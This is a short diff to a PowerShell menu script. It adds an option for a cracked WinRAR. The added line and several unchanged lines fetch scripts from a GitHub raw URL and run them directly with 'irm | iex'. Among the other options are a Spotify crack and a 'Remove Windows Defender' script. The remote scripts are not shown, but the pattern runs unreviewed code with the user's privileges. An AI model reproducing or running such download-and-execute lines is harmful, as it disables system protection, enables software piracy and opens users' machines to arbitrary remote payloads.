@@ -17,6 +17,7 @@ do {
     Write-Host "11. Install SpotX (Spotify Cracked)"
     Write-Host "12. Remove Windows Defender"
     Write-Host "13. Install System Informer"
+    Write-Host "14. WinRar Cracked (Needs WinRaR Installed)"
     Write-Host ""
     Write-Host "Q. Exit" -ForegroundColor Red
     Write-Host ""
@@ -36,6 +37,7 @@ do {
         "11" { $t="$env:TEMP\s.bat"; irm https://raw.githubusercontent.com/archlinux-dev/win10/main/spotifycrack.bat -OutFile $t; start cmd "/c `"$t`"" }
         "12" { irm https://raw.githubusercontent.com/archlinux-dev/win10/main/removedefender.ps1 | iex }
         "13" { irm https://raw.githubusercontent.com/archlinux-dev/win10/main/sysinfo.ps1 | iex }
+        "14" { irm https://raw.githubusercontent.com/archlinux-dev/win10/main/winrar.ps1 | iex }
         "Q" { break }
         default { Write-Host "Invalid choice" -ForegroundColor Red; Start-Sleep -Seconds 1 }
     }
